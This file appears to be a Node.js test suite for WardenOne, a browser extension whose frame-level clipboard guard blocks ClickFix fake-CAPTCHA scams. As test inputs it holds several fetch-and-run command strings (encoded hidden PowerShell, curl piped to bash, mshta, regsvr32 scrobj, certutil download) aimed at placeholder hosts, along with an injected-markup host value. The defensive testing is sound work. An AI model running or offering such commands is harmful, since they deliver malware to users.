/* WardenOne — Copyright (C) 2026 iri
   Licensed under the GNU General Public License v3 or later. See LICENSE.
   Official source: https://github.com/iri-dev/WardenOne
   Upstream filter-list attribution: CREDITS.md
   Redistributing a modified copy? GPLv3 section 5(a) requires you to mark it as changed,
   with the date, and to keep these notices intact. */
/*
 * A ClickFix scam inside an iframe must not be a ClickFix scam WardenOne cannot see (SEC-06).
 *
 * The command-paste guard lives in content.min.js, which the manifest loads in the top frame
 * only -- its size is why. So a fake CAPTCHA rendered inside a full-viewport frame could copy
 * "powershell -enc ..." to the clipboard with no detector anywhere near it: the reader saw the
 * same scam, and no warning. anti-redirect.js already runs in every frame at document_start,
 * so the smallest piece of the guard that still defeats the attack lives there: the same
 * clipboard hooks, the same twelve command shapes, no page-text scanning. A hit refuses the
 * write and reports it; the worker asks the top frame's engine to show the panel it would have
 * shown for its own document.
 *
 * What is asserted:
 *   - the frame's patterns and documentation-host exception are byte-identical to the top
 *     frame's, so the two cannot drift apart
 *   - the shipped frame guard, run in a stub frame: refuses a command, passes ordinary text,
 *     neutralises copy-event and execCommand routes, makes the documentation exception, stays
 *     out of the top frame, respects the switch, and caps its reports
 *   - the worker keeps the attacker's text out of history and validates the frame host
 *   - the relay reaches the top frame token-carried, and the page cannot fill the slot itself
 *   - the manifest premise (top-only engine, all-frame hardener) and the honest coverage copy
 *
 * Run: node tools/test-frame-clickfix.js
 */
'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');

const ROOT = path.resolve(__dirname, '..');
const AR = fs.readFileSync(path.join(ROOT, 'anti-redirect.js'), 'utf8');
const SRC = fs.readFileSync(path.join(ROOT, 'src', 'content.js'), 'utf8');
const MIN = fs.readFileSync(path.join(ROOT, 'content.min.js'), 'utf8');
const BG = fs.readFileSync(path.join(ROOT, 'background.js'), 'utf8');
const BRIDGE = fs.readFileSync(path.join(ROOT, 'bridge.js'), 'utf8');
const MANIFEST = JSON.parse(fs.readFileSync(path.join(ROOT, 'manifest.json'), 'utf8'));

let failures = 0;
function check(label, condition, extra) {
  if (condition) { console.log('  ok  ' + label); return; }
  failures++;
  console.log('  FAIL ' + label + (extra ? ' :: ' + extra : ''));
}
function between(src, startMark, endMark, what) {
  const a = src.indexOf(startMark);
  if (a < 0) throw new Error('cannot find the start of ' + what);
  const b = src.indexOf(endMark, a + startMark.length);
  if (b < 0) throw new Error('cannot find the end of ' + what);
  return src.slice(a, b);
}

/* ---- 1. the premise ---------------------------------------------------------------- */
const engine = MANIFEST.content_scripts.find((c) => c.js.includes('content.min.js'));
const hardener = MANIFEST.content_scripts.find((c) => c.js.includes('anti-redirect.js'));
check('the engine is still top-frame only (the gap this guard fills)', engine && engine.all_frames === false);
check('the hardener runs in every frame, in the page world, at document_start',
  hardener && hardener.all_frames === true && hardener.world === 'MAIN' && hardener.run_at === 'document_start');
check('and in about:blank and sandboxed frames too', hardener && hardener.match_about_blank === true && hardener.match_origin_as_fallback === true);

/* ---- 2. one set of patterns ------------------------------------------------------- */
const topPatterns = between(SRC, 'const CMD_PATTERNS=[', '],', 'CMD_PATTERNS')
  .slice('const CMD_PATTERNS=['.length).split('\n').map((l) => l.trim()).filter(Boolean);
const framePatterns = between(AR, 'const FRAME_CMD_PATTERNS = [', '\n  ];', 'FRAME_CMD_PATTERNS')
  .slice('const FRAME_CMD_PATTERNS = ['.length).split('\n').map((l) => l.trim()).filter(Boolean);
check('the frame guard carries every command shape the top guard has',
  topPatterns.length === 12 && framePatterns.length === topPatterns.length, framePatterns.length + ' vs ' + topPatterns.length);
check('byte for byte', framePatterns.join('\n') === topPatterns.join('\n'),
  'a shape added to one and not the other is a scam that works in exactly one of them');
const topDoc = (/CLICKFIX_DOC_HOST=(\/.*?\/i),/.exec(SRC) || [])[1];
const frameDoc = (/const FRAME_CLICKFIX_DOC_HOST = (\/.*?\/i);/.exec(AR) || [])[1];
check('the documentation-host exception is the same list', topDoc && frameDoc === topDoc);

/* ---- 3. run the shipped frame guard in a stub frame -------------------------------- */
const GUARD = between(AR, '  // ---- ClickFix clipboard guard, for frames (SEC-06) ----', '  installFrameClipboardGuard();\n', 'the frame guard');

function frame({ top, host, guardOn, master } = {}) {
  const emitted = [];
  const real = { writeText: [], write: [], exec: [] };
  const listeners = {};
  const clipboard = {
    writeText(t) { real.writeText.push(t); return Promise.resolve('written'); },
    write(items) { real.write.push(items); return Promise.resolve('written'); },
  };
  const ctx = {
    console: { warn() {} }, Promise, String, Array, Number, RegExp, Object,
    DOMException: class DOMException extends Error { constructor(m, n) { super(m); this.name = n; } },
    TOP_FRAME: !!top,
    masterEnabled: () => master !== false,
    cfg: () => ({ commandPasteGuard: guardOn !== false }),
    emit: (type, detail) => emitted.push({ type, detail }),
    woOn: (target, type, fn) => { listeners[type] = fn; },
    location: { hostname: host || 'scam.example' },
    navigator: { clipboard },
    window: { getSelection: () => ({ toString: () => ctx.__selection || '' }) },
    document: {
      activeElement: null,
      execCommand(cmd) { real.exec.push(cmd); return true; },
    },
    __selection: '',
  };
  ctx.globalThis = ctx;
  vm.createContext(ctx);
  vm.runInContext(GUARD + '\n  installFrameClipboardGuard();', ctx);
  return { ctx, emitted, real, listeners, clipboard };
}

const CMD = 'powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA';
const isBlocked = (p) => p.then(() => false, (e) => e && e.name === 'NotAllowedError');

(async () => {
  {
    const f = frame({});
    check('a command-shaped writeText is refused', await isBlocked(f.ctx.navigator.clipboard.writeText(CMD)));
    check('and never reaches the real clipboard', f.real.writeText.length === 0);
    check('and is reported as a frame block', f.emitted.length === 1 && f.emitted[0].type === 'blocked_command_paste_frame',
      JSON.stringify(f.emitted));
    check('with a bounded sample and the frame host',
      f.emitted[0] && /powershell/i.test(f.emitted[0].detail.sample) && f.emitted[0].detail.sample.length <= 160
      && f.emitted[0].detail.frameHost === 'scam.example');
    check('ordinary text passes through untouched',
      (await f.ctx.navigator.clipboard.writeText('meeting notes for tuesday')) === 'written' && f.real.writeText[0] === 'meeting notes for tuesday');
    check('a homoglyph-spaced command is still recognised',
      await isBlocked(f.ctx.navigator.clipboard.writeText('curl https://x.example/a.sh | bash')));
  }
  {
    const f = frame({});
    const item = { types: ['text/plain'], getType: () => Promise.resolve({ text: () => Promise.resolve('mshta https://x.example/p.hta') }) };
    check('clipboard.write with a text item carrying a command is refused', await isBlocked(f.ctx.navigator.clipboard.write([item])));
    const benign = { types: ['text/plain'], getType: () => Promise.resolve({ text: () => Promise.resolve('hello') }) };
    check('and an ordinary item is written', (await f.ctx.navigator.clipboard.write([benign])) === 'written');
  }
  {
    const f = frame({});
    f.ctx.__selection = 'regsvr32 /s /u /i:https://x.example/p.sct scrobj.dll';
    check('execCommand("copy") of a selected command returns false', f.ctx.document.execCommand('copy') === false);
    check('and the real copy never ran', f.real.exec.length === 0);
    f.ctx.__selection = 'a paragraph of prose';
    check('an ordinary selection copies', f.ctx.document.execCommand('copy') === true && f.real.exec[0] === 'copy');
    check('other commands are untouched', f.ctx.document.execCommand('bold') === true);
  }
  {
    const f = frame({});
    const set = [];
    let prevented = false;
    const event = { clipboardData: { setData: (t, d) => { set.push([t, d]); } }, preventDefault: () => { prevented = true; } };
    f.listeners.copy(event);
    event.clipboardData.setData('text/plain', 'certutil -urlcache -split -f https://x.example/a.exe a.exe');
    check('a copy handler writing a command through setData is neutralised',
      set.length === 1 && /Blocked by WardenOne/.test(set[0][1]) && prevented, JSON.stringify(set));
    const event2 = { clipboardData: { setData: (t, d) => { set.push([t, d]); } }, preventDefault: () => {} };
    f.listeners.copy(event2);
    event2.clipboardData.setData('text/plain', 'just a quote');
    check('and an ordinary setData goes through', set[1] && set[1][1] === 'just a quote');
  }
  {
    const f = frame({ host: 'developer.mozilla.org' });
    check('a documentation host embedded in a frame may copy a shell one-liner',
      (await f.ctx.navigator.clipboard.writeText('curl -fsSL https://get.example.org/install.sh | bash')) === 'written' && f.emitted.length === 0);
  }
  {
    const f = frame({ guardOn: false });
    check('the switch is honoured', (await f.ctx.navigator.clipboard.writeText(CMD)) === 'written' && f.emitted.length === 0);
    const g = frame({ master: false });
    check('and so is the master switch', (await g.ctx.navigator.clipboard.writeText(CMD)) === 'written');
  }
  {
    const f = frame({ top: true });
    check('the top frame is left to the full guard: nothing is hooked',
      f.ctx.navigator.clipboard.writeText === f.clipboard.writeText && !f.listeners.copy);
  }
  {
    const f = frame({});
    for (let i = 0; i < 6; i++) await isBlocked(f.ctx.navigator.clipboard.writeText(CMD + i));
    check('reports are capped per frame, the refusal is not', f.emitted.length === 3 && f.real.writeText.length === 0, f.emitted.length + ' reports');
  }

  /* ---- 4. the worker keeps the attacker's text out of history ----------------------- */
  {
    const consts = between(BG, 'const CLICKFIX_ACTIVITY_MESSAGE_TYPES = new Set([', '\nfunction normalizeClickfixActivityDetail', 'the clickfix vocab');
    const fn = between(BG, 'function normalizeClickfixActivityDetail(type, detail) {', '\nfunction securityHistoryAllowed', 'the normaliser');
    const ctx = { Set, String, RegExp };
    vm.createContext(ctx);
    vm.runInContext(consts + '\n' + fn + '\nglobalThis.normalize = normalizeClickfixActivityDetail; globalThis.types = CLICKFIX_ACTIVITY_MESSAGE_TYPES;', ctx);
    check('the frame block is a recognised activity type', ctx.types.has('blocked_command_paste_frame'));
    const out = ctx.normalize('blocked_command_paste_frame', { where: 'copy event', sample: CMD, frameHost: 'Scam.Example' });
    check('the recorded detail carries no sample', JSON.stringify(out).indexOf('powershell') === -1, JSON.stringify(out));
    check('it is recorded as blocked, high severity, and says it came from a frame',
      out.blocked === true && out.severity === 'High' && /embedded frame/.test(out.evidence) && /from a frame/.test(out.why));
    check('the frame host is kept, lower-cased', out.frameHost === 'scam.example');
    check('a frame host that is not a hostname is dropped',
      ctx.normalize('blocked_command_paste_frame', { frameHost: '<img src=x onerror=1>' }).frameHost === '');
    check('an unknown where falls back to the vocabulary',
      ctx.normalize('blocked_command_paste_frame', { where: 'somewhere else' }).where === 'clipboard');
  }

  /* ---- 5. the relay ------------------------------------------------------------------ */
  const relay = between(BG, "if (msg && msg.kind === 'rg-block') {", '// ADAPTIVE LEARNING', 'the rg-block branch');
  check('the worker relays a frame block to frame 0 of the same tab',
    /normalized\.type === 'blocked_command_paste_frame' && Number\(sender\.frameId\) > 0/.test(relay)
    && /chrome\.tabs\.sendMessage\(tabId, \{\s*kind: 'frame-clickfix'/.test(relay) && /\{ frameId: 0 \}/.test(relay));
  check('a frame block bumps the badge like any other block',
    !/'blocked_command_paste_frame'/.test(between(BG, 'const NO_BADGE_TYPES = new Set([', ']);', 'no-badge types')));
  const bridgeRelay = between(BRIDGE, "if (msg && msg.kind === 'frame-clickfix'", '      }\n', 'the bridge relay');
  check('the bridge forwards it only from the top frame, token-carried',
    /window === window\.top/.test(bridgeRelay) && /token: TOKEN/.test(bridgeRelay));
  const receiver = between(SRC, 'if("wardenone"===m.source&&"frame-clickfix"===m.kind){', 'if("wardenone"===m.source&&"config"===m.kind', 'the page receiver');
  check('the page engine checks the token and the signature before accepting it (SEC-01)',
    /m\.token!==__woToken\|\|!__woVerify\("frame-clickfix",JSON\.stringify\(m\.detail\),m\)\)return/.test(receiver));
  check('and pokes the guard with an event that carries nothing', /new CustomEvent\("wo-frame-clickfix"\)\)/.test(receiver),
    'a page can dispatch the same event; what it cannot do is fill __woFrameClickfix');
  const trigger = between(SRC, '"wo-frame-clickfix",\n      ()=>{', '"click"].forEach', 'the panel trigger');
  check('the guard reads the private slot and clears it', /const d=__woFrameClickfix;\s*__woFrameClickfix=null;/.test(trigger));
  check('and shows the panel at correlated level', /showCommandPanel\(String\(d\.sample\|\|""\),[\s\S]*3,\s*"frame"\)/.test(trigger));
  check('the panel has words for a frame', /"frame"===kind\?"Something embedded in this page tried to copy a suspicious command"/.test(SRC));
  check('all of which shipped in the built engine',
    MIN.includes('__woFrameClickfix') && MIN.includes('"wo-frame-clickfix"') && MIN.includes('"frame"===kind?"Something embedded in this page'));

  /* ---- 6. the copy says where it looks ---------------------------------------------- */
  const readme = fs.readFileSync(path.join(ROOT, 'README.md'), 'utf8');
  const popup = fs.readFileSync(path.join(ROOT, 'popup.html'), 'utf8');
  check('the README says instruction reading is top-level only and frames get the clipboard half',
    /runs on the top-level page only/.test(readme) && /Embedded frames get the clipboard half/.test(readme));
  check('and names the two surfaces it cannot read', /closed shadow tree/.test(readme) && /image or on a canvas/.test(readme));
  check('the popup says the same next to the switch',
    /embedded frames get the clipboard check only/.test(popup) && /closed shadow tree is not read at all/.test(popup));

  console.log('');
  if (failures) { console.log(failures + ' check(s) failed'); process.exit(1); }
  console.log('all frame ClickFix checks passed');
})();
